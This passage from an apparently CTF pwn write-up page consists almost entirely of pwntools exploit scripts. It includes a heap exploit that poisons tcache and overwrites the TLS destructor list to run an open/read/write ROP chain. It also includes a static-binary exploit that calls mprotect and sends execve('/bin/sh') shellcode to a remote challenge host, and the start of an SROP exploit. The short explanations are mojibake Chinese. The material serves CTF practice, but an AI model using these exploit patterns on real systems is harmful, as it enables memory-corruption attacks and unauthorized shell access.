<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># 0x5600edb1db20-0x5600edb1d000</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>

tls <span class="token operator">=</span> base_libc <span class="token operator">-</span><span class="token number">10432</span>
xor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">12</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>tls<span class="token operator">^</span>xor<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">-</span><span class="token number">0x28c0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_libc<span class="token operator">-</span><span class="token number">0x1ea0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>
<span class="token comment"># 0x7fe867b61160</span>
data <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># print(data)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
key <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">759</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment"># fd</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42050</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># index 8</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
write <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x114870</span><span class="token punctuation">)</span>
open64 <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1144E0</span>  <span class="token punctuation">)</span>
read <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x1147D0</span><span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x2a3e5</span><span class="token punctuation">)</span>
pop_rsi <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x2be51</span><span class="token punctuation">)</span>
pop_rdx_r12 <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x11f2e7</span><span class="token punctuation">)</span>
pop_rsp <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_libc<span class="token operator">+</span><span class="token number">0x35732</span><span class="token punctuation">)</span>
leave <span class="token operator">=</span> base_libc<span class="token operator">+</span><span class="token number">0x133BEA</span>
flag <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0x1398</span>
r_s <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0x1390</span>
buff <span class="token operator">=</span> base_heap<span class="token operator">+</span><span class="token number">0xf40</span>
sendline <span class="token operator">=</span> base_libc<span class="token operator">+</span><span class="token number">0x119170</span>
addr <span class="token operator">=</span> rol<span class="token punctuation">(</span>leave<span class="token operator">^</span>key<span class="token punctuation">)</span>
pop_rcx <span class="token operator">=</span>base_libc <span class="token operator">+</span><span class="token number">0x3d1ee</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;r\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b&quot;./flag\x00&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx_r12<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>write<span class="token punctuation">)</span>
tls_dtor_list <span class="token operator">=</span> tls<span class="token operator">-</span><span class="token number">88</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">+</span><span class="token number">0x42</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>tls_dtor_list<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42260</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># add(14,128,p64(addr)+pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+write)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>open64<span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx_r12<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>read<span class="token operator">+</span>pop_rsp<span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0xba0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;tls_dtor_list&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tls_dtor_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;canary&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_heap&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;leave:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leave<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
<span class="token comment"># 0x556f210bd050-0x556f2107b000</span>
<span class="token comment"># print(&quot;canary&quot;,hex(canary))</span>
<span class="token comment"># print(&quot;key&quot;,hex(key))</span>
<span class="token comment"># print(&quot;base_heap&quot;,hex(base_heap))</span>
<span class="token comment"># print(&quot;base_libc&quot;,hex(base_libc))</span>
<span class="token comment"># debug()</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;4&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="static-link" tabindex="-1"><a class="header-anchor" href="#static-link" aria-hidden="true">#</a> static_link</h2><blockquote><p>é™æ€é“¾æ¥ æˆ‘ä»¬ç›´æ¥é€šè¿‡mprotectå‡½æ•° å¼€ä¸€å—å†…å­˜å‡ºæ¥æ‰§è¡Œshellcodeå³å¯</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>
<span class="token keyword">import</span> time
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">33168</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401f1f</span><span class="token punctuation">)</span>
pop_rsi <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x409f8e</span><span class="token punctuation">)</span>
pop_rdx <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x451322</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x40101a</span><span class="token punctuation">)</span>
read <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x447580</span> <span class="token punctuation">)</span>
mprotect <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4482C0</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;static_link? ret2??\n&quot;</span><span class="token punctuation">)</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x4C8000</span>
payload <span class="token operator">=</span> <span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>mprotect<span class="token operator">+</span>pop_rdi<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>pop_rsi<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>pop_rdx<span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token operator">+</span>read<span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span><span class="token string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>
sd<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="simple-srop" tabindex="-1"><a class="header-anchor" href="#simple-srop" aria-hidden="true">#</a> simple_srop</h2><blockquote><p>srop+orw æ³¨æ„ä¸€ä¸‹æ¯ä¸ªæŒ‡ä»¤ä¹‹é—´æ‰§è¡Œçš„é—´è·å°±å¯ä»¥äº†</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">53647</span>


<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
